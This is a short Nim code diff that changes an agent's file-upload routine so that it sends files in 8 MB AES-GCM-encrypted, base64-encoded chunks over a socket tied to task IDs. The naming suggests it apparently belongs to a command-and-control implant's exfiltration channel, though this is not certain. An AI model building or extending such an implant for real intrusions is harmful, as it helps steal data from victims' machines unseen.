@@ -187,15 +187,24 @@ proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
 
 proc uploadFile*(t: var AgentTransport; taskId: int64;
                  filename: string; data: seq[byte]) =
+  const chunkSize = 8 * 1024 * 1024
+  let totalChunks = max(1, (data.len + chunkSize - 1) div chunkSize)
+  let fileId = $taskId
   try:
-    let inner  = %*{"task_id": taskId, "filename": filename,
-                    "data": base64.encode(cast[string](data))}
-    let plain  = cast[seq[byte]]($inner)
-    let enc    = sealGCM(t.aesKey, plain)
-    let encB64 = base64.encode(cast[string](enc))
-    let msg    = %*{"t": "upload", "p": encB64}
-    writeFrame(t.sock, $msg)
-    t.recvAck()
+    for i in 0 ..< totalChunks:
+      let start  = i * chunkSize
+      let finish = min(start + chunkSize, data.len)
+      let chunk  = data[start ..< finish]
+      let inner  = %*{
+        "task_id": taskId, "filename": filename, "file_id": fileId,
+        "chunk_index": i, "total_chunks": totalChunks,
+        "data": base64.encode(cast[string](chunk))}
+      let plain  = cast[seq[byte]]($inner)
+      let enc    = sealGCM(t.aesKey, plain)
+      let encB64 = base64.encode(cast[string](enc))
+      let msg    = %*{"t": "upload_chunk", "p": encB64}
+      writeFrame(t.sock, $msg)
+      t.recvAck()
   except:
     t.reconnect()
 
